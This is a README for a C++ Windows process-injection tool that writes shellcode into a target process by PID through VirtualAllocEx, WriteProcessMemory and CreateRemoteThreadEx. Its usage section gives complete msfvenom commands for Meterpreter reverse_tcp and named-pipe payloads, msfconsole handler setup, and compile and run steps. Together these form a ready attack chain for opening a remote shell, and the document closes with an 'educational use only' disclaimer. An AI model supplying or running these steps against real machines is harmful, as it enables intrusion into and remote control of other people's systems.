# ProcessInjection_01

## Overview
`ProcessInjection_01.cpp` is a Windows-based process injection tool that utilizes API calls such as `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThreadEx` to inject and execute shellcode within a target process. The shellcode is generated using Metasploit's `msfvenom`, and the tool allows users to execute reverse shell payloads.

## Features
- Injects shellcode into a target process by PID.
- Uses `VirtualAllocEx` to allocate memory in the remote process.
- Writes shellcode into the allocated memory using `WriteProcessMemory`.
- Executes the shellcode in the target process using `CreateRemoteThreadEx`.
- Supports x64 payloads for Windows systems.

## Requirements
- Windows OS (64-bit recommended)
- Administrative privileges (to access target processes)
- Metasploit Framework for shellcode generation
- C++ Compiler (MSVC, MinGW, or equivalent)

## Usage

### 1. Generate Payload
To generate a reverse shell payload, use Metasploit's `msfvenom`:

#### x64 Payload:
```sh
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
```

#### x86 Payload:
```sh
msfvenom --platform windows -a x86 -p payload/windows/custom/reverse_named_pipe LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke003
```

### 2. Start Metasploit Listener
Start a Metasploit listener to receive the connection:
```sh
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <your_ip>
set lport 443
run -j
```

### 3. Compile the Code
Compile the C++ program using a suitable compiler:
```sh
g++ -o ProcessInjection_01.exe ProcessInjection_01.cpp -lws2_32
```

### 4. Run the Injector
Execute the injector with the target process ID:
```sh
ProcessInjection_01.exe <PID>
```

## API Functions Used
- `OpenProcess()` – Opens a handle to the target process.
- `VirtualAllocEx()` – Allocates memory in the target process.
- `WriteProcessMemory()` – Writes shellcode into allocated memory.
- `CreateRemoteThreadEx()` – Creates a thread in the target process to execute the shellcode.
- `CloseHandle()` – Cleans up process and thread handles.

## Disclaimer
This software is for educational and research purposes only. Unauthorized use of this tool against systems without explicit permission is illegal and may result in severe legal consequences. The author is not responsible for any misuse of this software.

## License
This project is released under the MIT License.

